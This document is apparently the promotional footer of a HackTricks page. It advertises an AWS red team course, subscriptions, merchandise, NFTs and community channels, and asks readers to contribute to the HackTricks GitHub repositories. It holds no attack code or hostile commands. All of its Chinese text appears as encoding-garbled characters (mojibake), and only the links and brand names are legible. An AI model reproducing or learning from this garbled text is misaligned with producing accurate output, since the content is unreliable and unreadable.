<summary><strong>é€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æ”»å‡»æŠ€å·§ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDFç‰ˆæœ¬**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹çš„PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
